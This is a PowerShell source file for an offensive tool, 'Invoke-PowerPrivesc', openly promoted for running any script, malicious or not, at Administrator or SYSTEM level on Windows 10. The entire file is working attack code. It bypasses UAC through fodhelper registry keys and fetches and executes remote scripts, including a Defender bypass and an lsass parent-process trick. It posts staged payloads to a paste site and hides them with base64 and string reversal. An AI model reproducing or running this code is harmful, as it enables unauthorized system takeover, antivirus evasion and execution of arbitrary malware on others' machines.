function Invoke-PowerPrivesc {
<#
.SYNOPSIS
 ____                        ____       _                     
|  _ \ _____      _____ _ __|  _ \ _ __(_)_   _____  ___  ___ 
| |_) / _ \ \ /\ / / _ \ '__| |_) | '__| \ \ / / _ \/ __|/ __|
|  __/ (_) \ V  V /  __/ |  |  __/| |  | |\ V /  __/\__ \ (__ 
|_|   \___/ \_/\_/ \___|_|  |_|   |_|  |_| \_/ \___||___/\___|
--------------------------------------------------------------
Your all-in-one Powershell privilege escalation tool to run ANY script from a webserver.
You heard it right,ANYTHING! Wether its malicious or not,WE DONT CARE! ;)
This script itself is also "Clean"
THIS SCRIPT ONLY SUPPORT WINDOWS 10!!!
Can go up to SYSTEM from normal user
Author: GetRektBoy724
Version : v1.1.0
Required Dependencies: None  
Optional Dependencies: None  
.DESCRIPTION
The privilige escalation method that this tool used is the same one with the one that used on MeterPwrShell (my other tool)
This tool literally can run any script you want,from a normal copy-paste file to injecting shellcode into lsass.exe
Dont forget to host the script somewhere! (my own recommendation is paste.c-net.org)
And also,dont even worry of your script is getting caught by AVs,we take care of the AV Evasion and Bypass ;)
.PARAMETER ScriptLink
The link that goes into the script
.PARAMETER ToPrivilege
The privilege you want,it can be Administrator or SYSTEM
.PARAMETER HideWindow
.EXAMPLE
Invoke-PowerPrivesc -ScriptLink https://paste.c-net.org/MaliciousScript -ToPrivilege SYSTEM -HideWindow
Description
-----------
Run the Script as SYSTEM with window hidden
.EXAMPLE
Invoke-PowerPrivesc -ScriptLink https://paste.c-net.org/MaliciousScript -ToPrivilege Administrator
Description
-----------
Run the Script as Administrator with window not hidden
#>

Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [String]
    $ScriptLink,
    [Parameter(Position = 1, Mandatory = $true)]
    [ValidateSet( 'Administrator', 'SYSTEM' )]
    [String]
    $ToPrivilege = 'SYSTEM',
    [Switch]
    $HideWindow = $false
)
#good tool needs a good banner
$banner = @"
 ____                        ____       _                     
|  _ \ _____      _____ _ __|  _ \ _ __(_)_   _____  ___  ___ 
| |_) / _ \ \ /\ / / _ \ '__| |_) | '__| \ \ / / _ \/ __|/ __|
|  __/ (_) \ V  V /  __/ |  |  __/| |  | |\ V /  __/\__ \ (__ 
|_|   \___/ \_/\_/ \___|_|  |_|   |_|  |_| \_/ \___||___/\___|
--------------------------------------------------------------
[----Your All-In-One Powershell Privilege Escalation Tool----]                                       
[--------------Built With Love By GetRektBoy724--------------]
[--------------https://github.com/GetRektBoy724--------------]
"@
Write-Host $banner
#check windows build number
Write-Host "Checking Windows Build Number ..."
[int]$BuildNumber = [System.Environment]::OSVersion.Version.Build
if ($BuildNumber -lt 10240) {
    throw "Your windows is not supported,shitass!"
}
Start-Sleep 1
#check privilege for now
Write-Host "Checking Privilege We Have For Now ..."
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$p = New-Object System.Security.Principal.WindowsPrincipal($id)
$username = [Security.Principal.WindowsIdentity]::GetCurrent().Name
if ($username -eq "NT AUTHORITY\SYSTEM") { 
$FromPrivilege = "SYSTEM"
}elseif ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
$FromPrivilege = "Administrator"
}elseif ( -not ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))) {
$FromPrivilege = "User"
}
#check if FromPrivilege and ToPrivilege is same or not
if ($FromPrivilege -eq $ToPrivilege) {
    throw "You already have that privilege,you dickhead!"
}
Start-Sleep 1
#check if machine has access to internet
Write-Host "Checking For Internet Access ..."
$internetconnection = Test-Connection -ComputerName google.com -Quiet
if (-not $internetconnection) {
    throw "This shit doesnt have internet connection,We cant continue!"
}
Start-Sleep 1
#check if ScriptLink is valid and accessable
Write-Host "Checking Your ScriptLink ..."
$HTTP_Request = [System.Net.WebRequest]::Create($ScriptLink)
$HTTP_Response = $HTTP_Request.GetResponse()
$HTTP_Status = [int]$HTTP_Response.StatusCode
If ($HTTP_Status -ne 200) {
    throw "Your ScriptLink is not accessable,you dumbass!"
} else {
    $HTTP_Response.Close()
}
Start-Sleep 1
#check if there is multiple lsass.exe
Write-Host "Checking If There Is Any lsass.exe Duplicate Process ..."
$lsassprocess = @(get-process -ea silentlycontinue lsass)
if ($lsassprocess.Count -gt 1) {
    Write-Host "lsass.exe Duplicate Process Detected,Killing it..."
    kill $lsassprocess.Id[1]
}
Start-Sleep 1

function UserToSYSTEM {
#craft the last stage and upload to paste.c-net.org
if ($HideWindow) {
$rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7DQokYWNjZXNzcHNnZXRzeXMgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL3BzZ2V0c3lzLnBzMSAtVXNlQmFzaWNQYXJzaW5nOw0KSW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3BzZ2V0c3lzOw0KW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLW5vcCAtVyBoaWRkZW4gLWVwIGJ5cGFzcyAtTm9FeGl0IC1Db21tYW5kIGAiYCRhY2Nlc3NzdGFydHVwID0gSW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gYCRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnU2NyaXB0TGluaycpO2AiIik7"
}else {
$rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7CiRhY2Nlc3Nwc2dldHN5cyA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvcHNnZXRzeXMucHMxIC1Vc2VCYXNpY1BhcnNpbmc7Ckludm9rZS1FeHByZXNzaW9uICRhY2Nlc3Nwc2dldHN5czsKW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLW5vcCAtZXAgYnlwYXNzIC1Ob0V4aXQgLUNvbW1hbmQgYCJgJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL09uZURvZXNOb3RTaW1wbHlCeXBhc3NFbnRpcmVXaW5EZWZlbmRlci5wczEgLVVzZUJhc2ljUGFyc2luZztJbnZva2UtRXhwcmVzc2lvbiBgJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdTY3JpcHRMaW5rJyk7YCIiKTs="    
}
$rawthirdstage = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$rawbase64thirdstage"))
$lastthirdstage = $rawthirdstage -replace "ScriptLink", "$ScriptLink"
$upload = Invoke-WebRequest -Uri http://paste.c-net.org/ -Method Post -Body $lastthirdstage -UseDefaultCredentials -UseBasicParsing
$stage3link = ((Select-String '(http[s]?)(:\/\/)([^\s,]+)(?=")' -Input $upload.Content).Matches.Value)
#craft the second stage and reverse it for obfuscation
if ($HideWindow) {
$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLW5vcCAtVyBoaWRkZW4gLWVwIGJ5cGFzcyAtQ29tbWFuZCAiJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL1VBQ0JTdGFydHVwLnBzMSAtVXNlQmFzaWNQYXJzaW5nO0ludm9rZS1FeHByZXNzaW9uICRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnc3RhZ2UzbGluaycpOyI="
} else {
$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLW5vcCAtZXAgYnlwYXNzIC1Db21tYW5kICIkYWNjZXNzc3RhcnR1cCA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvVUFDQlN0YXJ0dXAucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdzdGFnZTNsaW5rJyk7Ig=="
}
$rawsecondstage = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$rawbase64secondstage"))
$lastrawsecondstage = $rawsecondstage -replace "stage3link", "$stage3link"
$secondstagebase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($lastrawsecondstage))
$secondstagebase64array = $secondstagebase64.ToCharArray()
[array]::Reverse($secondstagebase64array)
$secondstagebase64rev = -join($secondstagebase64array)
#craft the first stage and execute 
$firststage = @"
Write-Host `"UserToSYSTEM Sequence Started!`"
Write-Host `"Creating Required Variables...`"
`$AIObypassinbase64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMx"
`$AIObypass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("`$AIObypassinbase64"))
`$reghiveinbase64 = "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ="
`$reghive = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("`$reghiveinbase64"))
`$reversecommandinbase64 = "$secondstagebase64rev"
`$reversingcommandinbase64 = `$reversecommandinbase64.ToCharArray()
[array]::Reverse(`$reversingcommandinbase64)
`$reversingcommandinbase642 = -join(`$reversingcommandinbase64)
`$command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("`$reversingcommandinbase642"))
`$processinbase64 = "QzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhl"
`$process = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("`$processinbase64"))
`$accessAIObypass = Invoke-WebRequest `$AIObypass -UseBasicParsing
Write-Host `"Launching ODNSBEWD Script...`"
Invoke-Expression `$accessAIObypass.Content
Write-Host `"Creating FodHelper Exploit Registries ...`"
New-Item "`$reghive" -Force
New-ItemProperty -Path "`$reghive" -Name "DelegateExecute" -Value "" -Force
`$program = "`$command"
Set-ItemProperty -Path "`$reghive" -Name "(default)" -Value `$program -Force
Start-Process "`$process" -WindowStyle Hidden
Start-Sleep 4
Write-Host `"Removing Registries...Bye!`"
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
[System.GC]::Collect()
"@
Invoke-Expression $firststage
}
function UserToAdmin {
#craft the second stage and reverse it for obfuscation
if ($HideWindow) {
$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLVcgaGlkZGVuIC1ub3AgLWVwIGJ5cGFzcyAtQ29tbWFuZCAiJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL1VBQ0JTdGFydHVwLnBzMSAtVXNlQmFzaWNQYXJzaW5nO0ludm9rZS1FeHByZXNzaW9uICRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnc3RhZ2UzbGluaycpOyI="
} else {
$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLW5vcCAtZXAgYnlwYXNzIC1Db21tYW5kICIkYWNjZXNzc3RhcnR1cCA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvVUFDQlN0YXJ0dXAucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdzdGFnZTNsaW5rJyk7Ig=="
}
$rawsecondstage = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$rawbase64secondstage"))
$lastrawsecondstage = $rawsecondstage -replace "stage3link", "$ScriptLink"
$secondstagebase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($lastrawsecondstage))
$secondstagebase64array = $secondstage.ToCharArray()
[array]::Reverse($secondstagebase64array)
$secondstagebase64rev = -join($secondstagebase64array)
#craft the first stage and execute 
$firststage = @"
Write-Host `"UserToAdmin Sequence Started!`"
Write-Host `"Creating Required Variables...`"
`$AIObypassinbase64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMx"
`$AIObypass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("`$AIObypassinbase64"))
`$reghiveinbase64 = "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ="
`$reghive = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("`$reghiveinbase64"))
`$reversecommandinbase64 = "$secondstagebase64rev"
`$reversingcommandinbase64 = `$reversecommandinbase64.ToCharArray()
[array]::Reverse(`$reversingcommandinbase64)
`$reversingcommandinbase642 = -join(`$reversingcommandinbase64)
`$command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("`$reversingcommandinbase642"))
`$processinbase64 = "QzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhl"
`$process = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("`$processinbase64"))
`$accessAIObypass = Invoke-WebRequest `$AIObypass -UseBasicParsing
Write-Host `"Launching ODNSBEWD Script...`"
Invoke-Expression `$accessAIObypass.Content
Write-Host `"Creating FodHelper Exploit Registries ...`"
New-Item "`$reghive" -Force
New-ItemProperty -Path "`$reghive" -Name "DelegateExecute" -Value "" -Force
`$program = "`$command"
Set-ItemProperty -Path "`$reghive" -Name "(default)" -Value `$program -Force
Start-Process "`$process" -WindowStyle Hidden
Start-Sleep 4
Write-Host `"Removing Registries...Bye!`"
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
[System.GC]::Collect()
"@
Invoke-Expression $firststage
}
function AdminToSYSTEM {
#craft the last stage and upload to paste.c-net.org
if ($HideWindow) {
$rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7DQokYWNjZXNzcHNnZXRzeXMgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL3BzZ2V0c3lzLnBzMSAtVXNlQmFzaWNQYXJzaW5nOw0KSW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3BzZ2V0c3lzOw0KW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLW5vcCAtVyBoaWRkZW4gLWVwIGJ5cGFzcyAtTm9FeGl0IC1Db21tYW5kIGAiYCRhY2Nlc3NzdGFydHVwID0gSW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gYCRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnU2NyaXB0TGluaycpO2AiIik7"
}else {
$rawbase64thirdstage = "JHByb2NpZCA9IGdldC1wcm9jZXNzIGxzYXNzIHwgc2VsZWN0IC1leHBhbmQgaWQ7CiRhY2Nlc3Nwc2dldHN5cyA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvcHNnZXRzeXMucHMxIC1Vc2VCYXNpY1BhcnNpbmc7Ckludm9rZS1FeHByZXNzaW9uICRhY2Nlc3Nwc2dldHN5czsKW0FrdURpdGVtZW5pbk9yYW5nVHVhS3VdOjpNaW50YWtTWVNURU1DdWsoJHByb2NpZCwiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiwiLW5vcCAtZXAgYnlwYXNzIC1Ob0V4aXQgLUNvbW1hbmQgYCJgJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL09uZURvZXNOb3RTaW1wbHlCeXBhc3NFbnRpcmVXaW5EZWZlbmRlci5wczEgLVVzZUJhc2ljUGFyc2luZztJbnZva2UtRXhwcmVzc2lvbiBgJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdTY3JpcHRMaW5rJyk7YCIiKTs="    
}
$rawthirdstage = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$rawbase64thirdstage"))
$lastthirdstage = $rawthirdstage -replace "ScriptLink", "$ScriptLink"
$upload = Invoke-WebRequest -Uri http://paste.c-net.org/ -Method Post -Body $lastthirdstage -UseDefaultCredentials -AllowUnencryptedAuthentication -UseBasicParsing
$stage2link = ((Select-String '(http[s]?)(:\/\/)([^\s,]+)(?=")' -Input $upload.Content).Matches.Value)
#craft the fist stage
if ($HideWindow) {
$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLVcgaGlkZGVuIC1ub3AgLWVwIGJ5cGFzcyAtQ29tbWFuZCAiJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL1VBQ0JTdGFydHVwLnBzMSAtVXNlQmFzaWNQYXJzaW5nO0ludm9rZS1FeHByZXNzaW9uICRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnc3RhZ2UzbGluaycpOyI="
} else {
$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLW5vcCAtZXAgYnlwYXNzIC1Db21tYW5kICIkYWNjZXNzc3RhcnR1cCA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvVUFDQlN0YXJ0dXAucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdzdGFnZTNsaW5rJyk7Ig=="
}
$rawsecondstage = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$rawbase64secondstage"))
$lastrawsecondstage = $rawsecondstage -replace "stage3link", "$stage2link"
Write-Host "AdminToSYSTEM Sequence Started!"
Invoke-Expression $lastrawsecondstage
}

if ($FromPrivilege -eq "Administrator" -And $ToPrivilege -eq "User") {
throw "ARE U STUPID???!!!"
}elseif ($FromPrivilege -eq "SYSTEM" -And $ToPrivilege -eq "Administrator") {
throw "ARE U STUPID???!!!"
}elseif ($FromPrivilege -eq "SYSTEM" -And $ToPrivilege -eq "User") {
throw "ARE U STUPID???!!!"
}elseif ($FromPrivilege -eq "User" -And $ToPrivilege -eq "SYSTEM") {
Write-Host "Lets Go Baby!"
Start-Sleep 1
UserToSYSTEM
}elseif ($FromPrivilege -eq "Administrator" -And $ToPrivilege -eq "SYSTEM") {
Write-Host "Lets Go Baby!"
Start-Sleep 1
AdminToSYSTEM
}elseif ($FromPrivilege -eq "User" -And $ToPrivilege -eq "Administrator") {
Write-Host "Lets Go Baby!"
Start-Sleep 1
UserToAdmin
}

}
